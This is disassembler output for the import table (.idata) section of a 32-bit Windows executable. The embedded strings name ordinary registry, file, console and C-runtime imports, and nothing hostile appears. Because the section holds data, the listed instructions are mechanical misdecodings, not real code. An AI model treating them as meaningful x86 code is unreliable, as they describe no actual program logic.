Disassembly of section .idata:

0040c000 <.idata>:
  40c000:	mov    al,0xc3
  40c002:	add    BYTE PTR [eax],al
  40c004:	ret    0xc3
  40c007:	add    dh,dl
  40c009:	ret    
  40c00a:	add    BYTE PTR [eax],al
  40c00c:	out    0xc3,al
  40c00e:	add    BYTE PTR [eax],al
  40c010:	hlt    
  40c011:	ret    
  40c012:	add    BYTE PTR [eax],al
  40c014:	stos   BYTE PTR es:[edi],al
  40c015:	enter  0x0,0xc4
  40c019:	enter  0x0,0x98
  40c01d:	enter  0x0,0x0
  40c021:	add    BYTE PTR [eax],al
  40c023:	add    BYTE PTR [esp+eax*8+0x0],cl
  40c027:	add    BYTE PTR [esi-0x3c],bl
  40c02a:	add    BYTE PTR [eax],al
  40c02c:	jo     0x40bff2
  40c02e:	add    BYTE PTR [eax],al
  40c030:	add    ah,0x0
  40c033:	add    BYTE PTR [edx-0x57ffff3c],dl
  40c039:	les    eax,FWORD PTR [eax]
  40c03b:	add    BYTE PTR [eax-0x39ffff3c],bh
  40c041:	les    eax,FWORD PTR [eax]
  40c043:	add    dl,bl
  40c045:	les    eax,FWORD PTR [eax]
  40c047:	add    dl,bh
  40c049:	les    eax,FWORD PTR [eax]
  40c04b:	add    BYTE PTR [edx],cl
  40c04d:	lds    eax,FWORD PTR [eax]
  40c04f:	add    BYTE PTR [edx],ah
  40c051:	lds    eax,FWORD PTR [eax]
  40c053:	add    BYTE PTR [edx],bh
  40c055:	lds    eax,FWORD PTR [eax]
  40c057:	add    BYTE PTR [eax-0x3b],dl
  40c05a:	add    BYTE PTR [eax],al
  40c05c:	(bad)  
  40c05d:	lds    eax,FWORD PTR [eax]
  40c05f:	add    BYTE PTR [ebp+eax*8+0x0],bh
  40c063:	add    BYTE PTR [edx-0x57ffff3b],dl
  40c069:	lds    eax,FWORD PTR [eax]
  40c06b:	add    BYTE PTR [esi-0x39ffff3b],dh
  40c071:	lds    eax,FWORD PTR [eax]
  40c073:	add    dl,dl
  40c075:	lds    eax,FWORD PTR [eax]
  40c077:	add    ah,ah
  40c079:	lds    eax,FWORD PTR [eax]
  40c07b:	add    BYTE PTR [esi],dh
  40c07d:	les    eax,FWORD PTR [eax]
  40c07f:	add    BYTE PTR [edx],al
  40c081:	mov    BYTE PTR [eax],0x0
  40c084:	sbb    al,dh
  40c086:	add    BYTE PTR [eax],al
  40c088:	cmp    dh,al
  40c08a:	add    BYTE PTR [eax],al
  40c08c:	xchg   dl,cl
  40c08e:	add    BYTE PTR [eax],al
  40c090:	jbe    0x40c05c
  40c092:	add    BYTE PTR [eax],al
  40c094:	fs retf 0x0
  40c098:	push   esp
  40c099:	retf   0x0
  40c09c:	inc    esp
  40c09d:	retf   0x0
  40c0a0:	xor    dl,cl
  40c0a2:	add    BYTE PTR [eax],al
  40c0a4:	and    al,0xca
  40c0a6:	add    BYTE PTR [eax],al
  40c0a8:	push   cs
  40c0a9:	retf   0x0
  40c0ac:	add    dl,cl
  40c0ae:	add    BYTE PTR [eax],al
  40c0b0:	lock leave 
  40c0b2:	add    BYTE PTR [eax],al
  40c0b4:	fcmove st,st(1)
  40c0b6:	add    BYTE PTR [eax],al
  40c0b8:	ret    0xc9
  40c0bb:	add    BYTE PTR [edx-0x67ffff37],dh
  40c0c1:	leave  
  40c0c2:	add    BYTE PTR [eax],al
  40c0c4:	or     cl,0x0
  40c0c7:	add    BYTE PTR [edx+0x6c0000ca],ah
  40c0cd:	leave  
  40c0ce:	add    BYTE PTR [eax],al
  40c0d0:	push   edx
  40c0d1:	leave  
  40c0d2:	add    BYTE PTR [eax],al
  40c0d4:	ds leave 
  40c0d6:	add    BYTE PTR [eax],al
  40c0d8:	sub    cl,cl
  40c0da:	add    BYTE PTR [eax],al
  40c0dc:	push   ss
  40c0dd:	leave  
  40c0de:	add    BYTE PTR [eax],al
  40c0e0:	clc    
  40c0e1:	enter  0x0,0xdc
  40c0e5:	enter  0x0,0xd4
  40c0e9:	enter  0x0,0x2a
  40c0ed:	les    eax,FWORD PTR [eax]
  40c0ef:	add    BYTE PTR [esp+eax*8],dl
  40c0f2:	add    BYTE PTR [eax],al
  40c0f4:	hlt    
  40c0f5:	lds    eax,FWORD PTR [eax]
  40c0f7:	add    BYTE PTR [esi-0x41ffff36],ch
  40c0fd:	retf   0x0
  40c100:	retf   0xca
  40c103:	add    dh,dl
  40c105:	retf   0x0
  40c108:	add    BYTE PTR [eax],al
  40c10a:	add    BYTE PTR [eax],al
  40c10c:	call   0xf240c1db
  40c111:	retf   0x0
  40c114:	xchg   edx,eax
  40c115:	mov    DWORD PTR [eax],0xc78400
  40c11b:	add    BYTE PTR [eax-0x39],dh
  40c11e:	add    BYTE PTR [eax],al
  40c120:	pop    eax
  40c121:	mov    DWORD PTR [eax],0xc74400
  40c127:	add    BYTE PTR [esi],dh
  40c129:	mov    DWORD PTR [eax],0xc72c00
  40c12f:	add    BYTE PTR [edi+eax*8],bl
  40c132:	add    BYTE PTR [eax],al
  40c134:	or     al,bh
  40c136:	add    BYTE PTR [eax],al
  40c138:	clc    
  40c139:	mov    BYTE PTR [eax],0x0
  40c13c:	jmp    0xc6:0xda0000c6
  40c143:	add    ah,cl
  40c145:	mov    BYTE PTR [eax],0x0
  40c148:	ret    0xc6
  40c14b:	add    BYTE PTR [esi-0x57ffff3a],dh
  40c151:	mov    BYTE PTR [eax],0x0
  40c154:	pushf  
  40c155:	mov    BYTE PTR [eax],0x0
  40c158:	nop
  40c159:	mov    BYTE PTR [eax],0x0
  40c15c:	test   dh,al
  40c15e:	add    BYTE PTR [eax],al
  40c160:	js     0x40c128
  40c162:	add    BYTE PTR [eax],al
  40c164:	data16 mov BYTE PTR [eax],0x0
  40c168:	pop    esp
  40c169:	mov    BYTE PTR [eax],0x0
  40c16c:	and    al,0xc7
  40c16e:	add    BYTE PTR [eax],al
  40c170:	cld    
  40c171:	retf   0x0
  40c174:	add    BYTE PTR [eax],al
  40c176:	add    BYTE PTR [eax],al
  40c178:	js     0x40c142
  40c17a:	add    BYTE PTR [eax],al
  40c17c:	push   esi
  40c17d:	enter  0x0,0x3e
  40c181:	enter  0x0,0x32
  40c185:	enter  0x0,0x20
  40c189:	enter  0x0,0x8
  40c18d:	enter  0x0,0xf4
  40c191:	mov    DWORD PTR [eax],0xc7da00
  40c197:	add    BYTE PTR [edx-0x53ffff39],bh
  40c19d:	mov    DWORD PTR [eax],0x0
  40c1a3:	add    BYTE PTR [eax],dl
  40c1a5:	jne    0x40c1e7
  40c1a7:	add    BYTE PTR [edx+eax*8],cl
	...
  40c1b2:	add    BYTE PTR [eax],al
  40c1b4:	push   es
  40c1b5:	les    eax,FWORD PTR [eax]
  40c1b7:	add    BYTE PTR [eax],al
  40c1b9:	rol    BYTE PTR [eax],0x0
  40c1bc:	xor    dl,al
	...
  40c1c6:	add    BYTE PTR [eax],al
  40c1c8:	dec    esi
  40c1c9:	mov    BYTE PTR [eax],0x0
  40c1cc:	and    al,0xc0
  40c1ce:	add    BYTE PTR [eax],al
  40c1d0:	sbb    bl,al
	...
  40c1da:	add    BYTE PTR [eax],al
  40c1dc:	mov    DWORD PTR fs:[eax],0xc10c00
  40c1e3:	add    BYTE PTR [ebx+eax*8+0x0],al
  40c1ea:	add    BYTE PTR [eax],al
  40c1ec:	add    BYTE PTR [eax],al
  40c1ee:	add    BYTE PTR [eax],al
  40c1f0:	mov    cs,eax
  40c1f2:	add    BYTE PTR [eax],al
  40c1f4:	js     0x40c1b7
	...
  40c20a:	add    BYTE PTR [eax],al
  40c20c:	mov    al,0xc3
  40c20e:	add    BYTE PTR [eax],al
  40c210:	ret    0xc3
  40c213:	add    dh,dl
  40c215:	ret    
  40c216:	add    BYTE PTR [eax],al
  40c218:	out    0xc3,al
  40c21a:	add    BYTE PTR [eax],al
  40c21c:	hlt    
  40c21d:	ret    
  40c21e:	add    BYTE PTR [eax],al
  40c220:	stos   BYTE PTR es:[edi],al
  40c221:	enter  0x0,0xc4
  40c225:	enter  0x0,0x98
  40c229:	enter  0x0,0x0
  40c22d:	add    BYTE PTR [eax],al
  40c22f:	add    BYTE PTR [esp+eax*8+0x0],cl
  40c233:	add    BYTE PTR [esi-0x3c],bl
  40c236:	add    BYTE PTR [eax],al
  40c238:	jo     0x40c1fe
  40c23a:	add    BYTE PTR [eax],al
  40c23c:	add    ah,0x0
  40c23f:	add    BYTE PTR [edx-0x57ffff3c],dl
  40c245:	les    eax,FWORD PTR [eax]
  40c247:	add    BYTE PTR [eax-0x39ffff3c],bh
  40c24d:	les    eax,FWORD PTR [eax]
  40c24f:	add    dl,bl
  40c251:	les    eax,FWORD PTR [eax]
  40c253:	add    dl,bh
  40c255:	les    eax,FWORD PTR [eax]
  40c257:	add    BYTE PTR [edx],cl
  40c259:	lds    eax,FWORD PTR [eax]
  40c25b:	add    BYTE PTR [edx],ah
  40c25d:	lds    eax,FWORD PTR [eax]
  40c25f:	add    BYTE PTR [edx],bh
  40c261:	lds    eax,FWORD PTR [eax]
  40c263:	add    BYTE PTR [eax-0x3b],dl
  40c266:	add    BYTE PTR [eax],al
  40c268:	(bad)  
  40c269:	lds    eax,FWORD PTR [eax]
  40c26b:	add    BYTE PTR [ebp+eax*8+0x0],bh
  40c26f:	add    BYTE PTR [edx-0x57ffff3b],dl
  40c275:	lds    eax,FWORD PTR [eax]
  40c277:	add    BYTE PTR [esi-0x39ffff3b],dh
  40c27d:	lds    eax,FWORD PTR [eax]
  40c27f:	add    dl,dl
  40c281:	lds    eax,FWORD PTR [eax]
  40c283:	add    ah,ah
  40c285:	lds    eax,FWORD PTR [eax]
  40c287:	add    BYTE PTR [esi],dh
  40c289:	les    eax,FWORD PTR [eax]
  40c28b:	add    BYTE PTR [edx],al
  40c28d:	mov    BYTE PTR [eax],0x0
  40c290:	sbb    al,dh
  40c292:	add    BYTE PTR [eax],al
  40c294:	cmp    dh,al
  40c296:	add    BYTE PTR [eax],al
  40c298:	xchg   dl,cl
  40c29a:	add    BYTE PTR [eax],al
  40c29c:	jbe    0x40c268
  40c29e:	add    BYTE PTR [eax],al
  40c2a0:	fs retf 0x0
  40c2a4:	push   esp
  40c2a5:	retf   0x0
  40c2a8:	inc    esp
  40c2a9:	retf   0x0
  40c2ac:	xor    dl,cl
  40c2ae:	add    BYTE PTR [eax],al
  40c2b0:	and    al,0xca
  40c2b2:	add    BYTE PTR [eax],al
  40c2b4:	push   cs
  40c2b5:	retf   0x0
  40c2b8:	add    dl,cl
  40c2ba:	add    BYTE PTR [eax],al
  40c2bc:	lock leave 
  40c2be:	add    BYTE PTR [eax],al
  40c2c0:	fcmove st,st(1)
  40c2c2:	add    BYTE PTR [eax],al
  40c2c4:	ret    0xc9
  40c2c7:	add    BYTE PTR [edx-0x67ffff37],dh
  40c2cd:	leave  
  40c2ce:	add    BYTE PTR [eax],al
  40c2d0:	or     cl,0x0
  40c2d3:	add    BYTE PTR [edx+0x6c0000ca],ah
  40c2d9:	leave  
  40c2da:	add    BYTE PTR [eax],al
  40c2dc:	push   edx
  40c2dd:	leave  
  40c2de:	add    BYTE PTR [eax],al
  40c2e0:	ds leave 
  40c2e2:	add    BYTE PTR [eax],al
  40c2e4:	sub    cl,cl
  40c2e6:	add    BYTE PTR [eax],al
  40c2e8:	push   ss
  40c2e9:	leave  
  40c2ea:	add    BYTE PTR [eax],al
  40c2ec:	clc    
  40c2ed:	enter  0x0,0xdc
  40c2f1:	enter  0x0,0xd4
  40c2f5:	enter  0x0,0x2a
  40c2f9:	les    eax,FWORD PTR [eax]
  40c2fb:	add    BYTE PTR [esp+eax*8],dl
  40c2fe:	add    BYTE PTR [eax],al
  40c300:	hlt    
  40c301:	lds    eax,FWORD PTR [eax]
  40c303:	add    BYTE PTR [esi-0x41ffff36],ch
  40c309:	retf   0x0
  40c30c:	retf   0xca
  40c30f:	add    dh,dl
  40c311:	retf   0x0
  40c314:	add    BYTE PTR [eax],al
  40c316:	add    BYTE PTR [eax],al
  40c318:	call   0xf240c3e7
  40c31d:	retf   0x0
  40c320:	xchg   edx,eax
  40c321:	mov    DWORD PTR [eax],0xc78400
  40c327:	add    BYTE PTR [eax-0x39],dh
  40c32a:	add    BYTE PTR [eax],al
  40c32c:	pop    eax
  40c32d:	mov    DWORD PTR [eax],0xc74400
  40c333:	add    BYTE PTR [esi],dh
  40c335:	mov    DWORD PTR [eax],0xc72c00
  40c33b:	add    BYTE PTR [edi+eax*8],bl
  40c33e:	add    BYTE PTR [eax],al
  40c340:	or     al,bh
  40c342:	add    BYTE PTR [eax],al
  40c344:	clc    
  40c345:	mov    BYTE PTR [eax],0x0
  40c348:	jmp    0xc6:0xda0000c6
  40c34f:	add    ah,cl
  40c351:	mov    BYTE PTR [eax],0x0
  40c354:	ret    0xc6
  40c357:	add    BYTE PTR [esi-0x57ffff3a],dh
  40c35d:	mov    BYTE PTR [eax],0x0
  40c360:	pushf  
  40c361:	mov    BYTE PTR [eax],0x0
  40c364:	nop
  40c365:	mov    BYTE PTR [eax],0x0
  40c368:	test   dh,al
  40c36a:	add    BYTE PTR [eax],al
  40c36c:	js     0x40c334
  40c36e:	add    BYTE PTR [eax],al
  40c370:	data16 mov BYTE PTR [eax],0x0
  40c374:	pop    esp
  40c375:	mov    BYTE PTR [eax],0x0
  40c378:	and    al,0xc7
  40c37a:	add    BYTE PTR [eax],al
  40c37c:	cld    
  40c37d:	retf   0x0
  40c380:	add    BYTE PTR [eax],al
  40c382:	add    BYTE PTR [eax],al
  40c384:	js     0x40c34e
  40c386:	add    BYTE PTR [eax],al
  40c388:	push   esi
  40c389:	enter  0x0,0x3e
  40c38d:	enter  0x0,0x32
  40c391:	enter  0x0,0x20
  40c395:	enter  0x0,0x8
  40c399:	enter  0x0,0xf4
  40c39d:	mov    DWORD PTR [eax],0xc7da00
  40c3a3:	add    BYTE PTR [edx-0x53ffff39],bh
  40c3a9:	mov    DWORD PTR [eax],0x0
  40c3af:	add    BYTE PTR [esi+0x2],bl
  40c3b2:	push   edx
  40c3b3:	gs addr16 inc ebx
  40c3b6:	jb     0x40c41d
  40c3b8:	popa   
  40c3b9:	je     0x40c420
  40c3bb:	dec    ebx
  40c3bc:	gs jns 0x40c404
  40c3bf:	js     0x40c418
  40c3c1:	add    BYTE PTR [ebx+0x67655202],dl
  40c3c7:	push   ecx
  40c3c8:	jne    0x40c42f
  40c3ca:	jb     0x40c445
  40c3cc:	push   esi
  40c3cd:	popa   
  40c3ce:	ins    BYTE PTR es:[edi],dx
  40c3cf:	jne    0x40c436
  40c3d1:	inc    ebp
  40c3d2:	js     0x40c42b
  40c3d4:	add    BYTE PTR [eax],al
  40c3d6:	xchg   BYTE PTR [edx],al
  40c3d8:	push   edx
  40c3d9:	gs addr16 dec edi
  40c3dc:	jo     0x40c443
  40c3de:	outs   dx,BYTE PTR ds:[esi]
  40c3df:	dec    ebx
  40c3e0:	gs jns 0x40c428
  40c3e3:	js     0x40c43c
  40c3e5:	add    BYTE PTR [ebp+0x2],dl
  40c3e8:	push   edx
  40c3e9:	gs addr16 inc ebx
  40c3ec:	ins    BYTE PTR es:[edi],dx
  40c3ed:	outs   dx,DWORD PTR ds:[esi]
  40c3ee:	jae    0x40c455
  40c3f0:	dec    ebx
  40c3f1:	gs jns 0x40c3f4
  40c3f4:	mov    ds:0x67655202,eax
  40c3f9:	push   ebx
  40c3fa:	gs je  0x40c453
  40c3fd:	popa   
  40c3fe:	ins    BYTE PTR es:[edi],dx
  40c3ff:	jne    0x40c466
  40c401:	inc    ebp
  40c402:	js     0x40c45b
  40c404:	add    BYTE PTR [eax],al
  40c406:	inc    ecx
  40c407:	inc    esp
  40c408:	push   esi
  40c409:	inc    ecx
  40c40a:	push   eax
  40c40b:	dec    ecx
  40c40c:	xor    esi,DWORD PTR [edx]
  40c40e:	cs fs ins BYTE PTR es:[edi],dx
  40c411:	ins    BYTE PTR es:[edi],dx
  40c412:	add    BYTE PTR [eax],al
  40c414:	inc    esi
  40c415:	add    eax,0x54746553
  40c41a:	push   0x64616572
  40c41f:	push   ebp
  40c420:	dec    ecx
  40c421:	dec    esp
  40c422:	popa   
  40c423:	outs   dx,BYTE PTR ds:[esi]
  40c424:	addr16 jne 0x40c488
  40c427:	addr16 gs add cl,dh
  40c42b:	add    eax,0x74697257
  40c430:	gs inc esi
  40c432:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x695705dd
  40c43a:	fs gs inc ebx
  40c43d:	push   0x6f547261
  40c442:	dec    ebp
  40c443:	jne    0x40c4b1
  40c445:	je     0x40c4b0
  40c447:	inc    edx
  40c448:	jns    0x40c4be
  40c44a:	gs add bh,ch
  40c44d:	add    DWORD PTR [edi+0x65],eax
  40c450:	je     0x40c495
  40c452:	outs   dx,DWORD PTR ds:[esi]
  40c453:	outs   dx,BYTE PTR ds:[esi]
  40c454:	jae    0x40c4c5
  40c456:	ins    BYTE PTR es:[edi],dx
  40c457:	gs dec ebp
  40c459:	outs   dx,DWORD PTR ds:[esi]
  40c45a:	fs add BYTE PTR gs:[eax],al
  40c45e:	push   ebp
  40c45f:	add    al,BYTE PTR [edi+0x65]
  40c462:	je     0x40c4b0
  40c464:	outs   dx,DWORD PTR ds:[esi]
  40c465:	arpl   WORD PTR [ecx+0x6c],sp
  40c468:	gs dec ecx
  40c46a:	outs   dx,BYTE PTR ds:[esi]
  40c46b:	outs   dx,WORD PTR ds:[esi]
  40c46d:	push   edi
  40c46e:	add    BYTE PTR [eax],al
  40c470:	call   0x616d:0x726f4601
  40c477:	je     0x40c4c6
  40c479:	gs jae 0x40c4ef
  40c47c:	popa   
  40c47d:	addr16 gs push edi
  40c480:	add    BYTE PTR [eax],al
  40c482:	lock add eax,0x74697257
  40c488:	gs inc ebx
  40c48a:	outs   dx,DWORD PTR ds:[esi]
  40c48b:	outs   dx,BYTE PTR ds:[esi]
  40c48c:	jae    0x40c4fd
  40c48e:	ins    BYTE PTR es:[edi],dx
  40c48f:	gs push edi
  40c491:	add    bl,dh
  40c493:	add    DWORD PTR [edi+0x65],eax
  40c496:	je     0x40c4db
  40c498:	outs   dx,DWORD PTR ds:[esi]
  40c499:	outs   dx,BYTE PTR ds:[esi]
  40c49a:	jae    0x40c50b
  40c49c:	ins    BYTE PTR es:[edi],dx
  40c49d:	gs dec edi
  40c49f:	jne    0x40c515
  40c4a1:	jo     0x40c518
  40c4a3:	je     0x40c4e8
  40c4a5:	push   eax
  40c4a6:	add    BYTE PTR [eax],al
  40c4a8:	ret    0x4702
  40c4ab:	gs je  0x40c501
  40c4ae:	je     0x40c514
  40c4b0:	dec    eax
  40c4b1:	popa   
  40c4b2:	outs   dx,BYTE PTR ds:[esi]
  40c4b3:	fs ins BYTE PTR es:[edi],dx
  40c4b5:	add    BYTE PTR gs:[eax],al
  40c4b8:	aas    
  40c4b9:	add    al,BYTE PTR [edi+0x65]
  40c4bc:	je     0x40c504
  40c4be:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x657079
  40c4c6:	dec    edx
  40c4c7:	add    al,BYTE PTR [edi+0x65]
  40c4ca:	je     0x40c512
  40c4cc:	jne    0x40c53a
  40c4ce:	ins    BYTE PTR es:[edi],dx
  40c4cf:	push   eax
  40c4d0:	popa   
  40c4d1:	je     0x40c53b
  40c4d3:	dec    esi
  40c4d4:	popa   
  40c4d5:	ins    DWORD PTR es:[edi],dx
  40c4d6:	gs push edi
  40c4d8:	add    BYTE PTR [eax],al
  40c4da:	inc    eax
  40c4db:	add    eax,0x54746553
  40c4e0:	push   0x64616572
  40c4e5:	push   eax
  40c4e6:	jb     0x40c54d
  40c4e8:	data16 gs jb 0x40c55e
  40c4ec:	gs fs push ebp
  40c4ef:	dec    ecx
  40c4f0:	dec    esp
  40c4f1:	popa   
  40c4f2:	outs   dx,BYTE PTR ds:[esi]
  40c4f3:	addr16 jne 0x40c557
  40c4f6:	addr16 gs jae 0x40c4fa
  40c4fa:	push   ecx
  40c4fb:	add    al,BYTE PTR [edi+0x65]
  40c4fe:	je     0x40c54c
  40c500:	popa   
  40c501:	jae    0x40c577
  40c503:	inc    ebp
  40c504:	jb     0x40c578
  40c506:	outs   dx,DWORD PTR ds:[esi]
  40c507:	jb     0x40c509
  40c509:	add    BYTE PTR [edx+eax*1],al
  40c50c:	inc    edi
  40c50d:	gs je  0x40c553
  40c510:	jne    0x40c584
  40c512:	jb     0x40c579
  40c514:	outs   dx,BYTE PTR ds:[esi]
  40c515:	je     0x40c55b
  40c517:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  40c51e:	jns    0x40c577
  40c520:	add    BYTE PTR [eax],al
  40c522:	in     eax,dx
  40c523:	add    al,0x53
  40c525:	gs je  0x40c56b
  40c528:	jne    0x40c59c
  40c52a:	jb     0x40c591
  40c52c:	outs   dx,BYTE PTR ds:[esi]
  40c52d:	je     0x40c573
  40c52f:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  40c536:	jns    0x40c58f
  40c538:	add    BYTE PTR [eax],al
  40c53a:	cmp    eax,DWORD PTR [ebx]
  40c53c:	dec    eax
  40c53d:	gs popa 
  40c53f:	jo     0x40c594
  40c541:	gs je  0x40c58d
  40c544:	outs   dx,BYTE PTR ds:[esi]
  40c545:	outs   dx,WORD PTR ds:[esi]
  40c547:	jb     0x40c5b6
  40c549:	popa   
  40c54a:	je     0x40c5b5
  40c54c:	outs   dx,DWORD PTR ds:[esi]
  40c54d:	outs   dx,BYTE PTR ds:[esi]
  40c54e:	add    BYTE PTR [eax],al
  40c550:	jae    0x40c553
  40c552:	inc    esi
  40c553:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  40c55a:	je     0x40c5a2
  40c55c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x1ce0000
  40c564:	inc    edi
  40c565:	gs je  0x40c5ab
  40c568:	outs   dx,DWORD PTR ds:[esi]
  40c569:	ins    DWORD PTR es:[edi],dx
  40c56a:	jo     0x40c5de
  40c56c:	gs jae 0x40c5e2
  40c56f:	gs fs inc esi
  40c572:	imul   ebp,DWORD PTR [ebp+eiz*2+0x53],0x57657a69
  40c57a:	add    BYTE PTR [eax],al
  40c57c:	adc    BYTE PTR [ebx],al
  40c57e:	inc    edi
  40c57f:	gs je  0x40c5d8
  40c582:	outs   dx,DWORD PTR ds:[esi]
  40c583:	ins    BYTE PTR es:[edi],dx
  40c584:	jne    0x40c5f3
  40c586:	gs push eax
  40c588:	popa   
  40c589:	je     0x40c5f3
  40c58b:	dec    esi
  40c58c:	popa   
  40c58d:	ins    DWORD PTR es:[edi],dx
  40c58e:	gs push edi
  40c590:	add    BYTE PTR [eax],al
  40c592:	add    al,BYTE PTR ss:[edi+0x65]
  40c596:	je     0x40c5de
  40c598:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  40c5a0:	bound  esi,QWORD PTR [ebp+0x74]
  40c5a3:	gs jae 0x40c5fd
  40c5a6:	add    BYTE PTR [eax],al
  40c5a8:	rol    BYTE PTR [eax],0x43
  40c5ab:	jb     0x40c612
  40c5ad:	popa   
  40c5ae:	je     0x40c615
  40c5b0:	inc    esi
  40c5b1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x53051600
  40c5b9:	gs je  0x40c608
  40c5bc:	popa   
  40c5bd:	jae    0x40c633
  40c5bf:	inc    ebp
  40c5c0:	jb     0x40c634
  40c5c2:	outs   dx,DWORD PTR ds:[esi]
  40c5c3:	jb     0x40c5c5
  40c5c5:	add    BYTE PTR [eax+0x1],ch
  40c5c8:	inc    esi
  40c5c9:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  40c5d0:	add    BYTE PTR gs:[ecx],dl
  40c5d3:	add    DWORD PTR [ebp+eiz*2+0x76],eax
  40c5d7:	imul   esp,DWORD PTR [ebx+0x65],0x6f436f49
  40c5de:	outs   dx,BYTE PTR ds:[esi]
  40c5df:	je     0x40c653
  40c5e1:	outs   dx,DWORD PTR ds:[esi]
  40c5e2:	ins    BYTE PTR es:[edi],dx
  40c5e3:	add    BYTE PTR [edi+0x1],bh
  40c5e6:	inc    esi
  40c5e7:	imul   ebp,DWORD PTR [esi+0x64],0x7478654e
  40c5ee:	inc    esi
  40c5ef:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x43007d00
  40c5f7:	ins    BYTE PTR es:[edi],dx
  40c5f8:	outs   dx,DWORD PTR ds:[esi]
  40c5f9:	jae    0x40c660
  40c5fb:	dec    eax
  40c5fc:	popa   
  40c5fd:	outs   dx,BYTE PTR ds:[esi]
  40c5fe:	fs ins BYTE PTR es:[edi],dx
  40c600:	add    BYTE PTR gs:[ebx+eax*1],dl
  40c604:	inc    edi
  40c605:	gs je  0x40c65f
  40c608:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  40c60f:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  40c616:	jns    0x40c66f
  40c618:	add    BYTE PTR [eax],al
  40c61a:	cmp    BYTE PTR [edx],al
  40c61c:	inc    edi
  40c61d:	gs je  0x40c666
  40c620:	imul   ebp,DWORD PTR [ebp+eiz*2+0x49],0x726f666e
  40c628:	ins    DWORD PTR es:[edi],dx
  40c629:	popa   
  40c62a:	je     0x40c695
  40c62c:	outs   dx,DWORD PTR ds:[esi]
  40c62d:	outs   dx,BYTE PTR ds:[esi]
  40c62e:	inc    edx
  40c62f:	jns    0x40c679
  40c631:	popa   
  40c632:	outs   dx,BYTE PTR ds:[esi]
  40c633:	fs ins BYTE PTR es:[edi],dx
  40c635:	add    BYTE PTR gs:[eax],al
  40c638:	add    DWORD PTR ds:0x46746553,eax
  40c63e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  40c646:	bound  esi,QWORD PTR [ebp+0x74]
  40c649:	gs jae 0x40c6a3
  40c64c:	add    BYTE PTR [eax],al
  40c64e:	dec    ebx
  40c64f:	inc    ebp
  40c650:	push   edx
  40c651:	dec    esi
  40c652:	inc    ebp
  40c653:	dec    esp
  40c654:	xor    esi,DWORD PTR [edx]
  40c656:	cs fs ins BYTE PTR es:[edi],dx
  40c659:	ins    BYTE PTR es:[edi],dx
  40c65a:	add    BYTE PTR [eax],al
  40c65c:	jo     0x40c663
  40c65e:	ja     0x40c6c3
  40c660:	jae    0x40c6c5
  40c662:	push   0xbd000072
  40c667:	add    DWORD PTR [edi+0x67],ebx
  40c66a:	gs je  0x40c6cc
  40c66d:	outs   dx,DWORD PTR ds:[esi]
  40c66e:	jae    0x40c6d6
  40c670:	push   0x6c646e61
  40c675:	add    BYTE PTR gs:[eax],al
  40c678:	outs   dx,DWORD PTR ds:[esi]
  40c679:	add    eax,0x63736377
  40c67e:	popa   
  40c67f:	je     0x40c6e0
  40c681:	jae    0x40c683
  40c683:	add    BYTE PTR [ebp+eax*1+0x77],dh
  40c687:	arpl   WORD PTR [ebx+0x63],si
  40c68a:	jo     0x40c705
  40c68c:	pop    edi
  40c68d:	jae    0x40c68f
  40c68f:	add    BYTE PTR ds:0x63775f04,cl
  40c695:	jae    0x40c700
  40c697:	arpl   WORD PTR [ebp+0x70],bp
  40c69a:	add    BYTE PTR [eax],al
  40c69c:	pop    ss
  40c69d:	add    al,0x5f
  40c69f:	ja     0x40c704
  40c6a1:	jae    0x40c711
  40c6a3:	imul   esp,DWORD PTR [ebx+0x6d],0x54d0070
  40c6aa:	jae    0x40c723
  40c6ac:	jo     0x40c720
  40c6ae:	imul   ebp,DWORD PTR [esi+0x74],0x735f66
  40c6b5:	add    BYTE PTR [edx],cl
  40c6b7:	add    eax,0x636d656d
  40c6bc:	jo     0x40c737
  40c6be:	pop    edi
  40c6bf:	jae    0x40c6c1
  40c6c1:	add    BYTE PTR [edx+0x5],bh
  40c6c4:	ja     0x40c729
  40c6c6:	jae    0x40c736
  40c6c8:	arpl   WORD PTR [ebp+0x70],bp
  40c6cb:	add    BYTE PTR [edi+0x0],ch
  40c6ce:	pop    edi
  40c6cf:	pop    eax
  40c6d0:	arpl   WORD PTR [eax+0x74],si
  40c6d3:	inc    esi
  40c6d4:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0xc90072
  40c6dc:	pop    edi
  40c6dd:	pop    edi
  40c6de:	jo     0x40c73f
  40c6e0:	pop    edi
  40c6e1:	arpl   WORD PTR [edi+0x6d],bp
  40c6e4:	ins    DWORD PTR es:[edi],dx
  40c6e5:	outs   dx,DWORD PTR ds:[esi]
  40c6e6:	fs add BYTE PTR gs:[eax],al
  40c6ea:	adc    DWORD PTR [ecx],eax
  40c6ec:	pop    edi
  40c6ed:	popa   
  40c6ee:	ins    DWORD PTR es:[edi],dx
  40c6ef:	jae    0x40c758
  40c6f1:	pop    edi
  40c6f2:	gs js  0x40c75e
  40c6f5:	je     0x40c6f7
  40c6f7:	add    cl,dh
  40c6f9:	add    BYTE PTR [edi+0x5f],bl
  40c6fc:	ja     0x40c765
  40c6fe:	gs je  0x40c76e
  40c701:	popa   
  40c702:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  40c709:	add    dl,ah
  40c70b:	add    BYTE PTR [edi+0x5f],bl
  40c70e:	jae    0x40c775
  40c710:	je     0x40c771
  40c712:	popa   
  40c713:	jo     0x40c785
  40c715:	pop    edi
  40c716:	je     0x40c791
  40c718:	jo     0x40c77f
  40c71a:	add    BYTE PTR [eax],al
  40c71c:	scas   al,BYTE PTR es:[edi]
  40c71d:	add    al,0x65
  40c71f:	js     0x40c78a
  40c721:	je     0x40c723
  40c723:	add    BYTE PTR [ebx+0x1],dh
  40c726:	pop    edi
  40c727:	gs js  0x40c793
  40c72a:	je     0x40c72c
  40c72c:	and    al,0x1
  40c72e:	pop    edi
  40c72f:	arpl   WORD PTR [ebp+0x78],sp
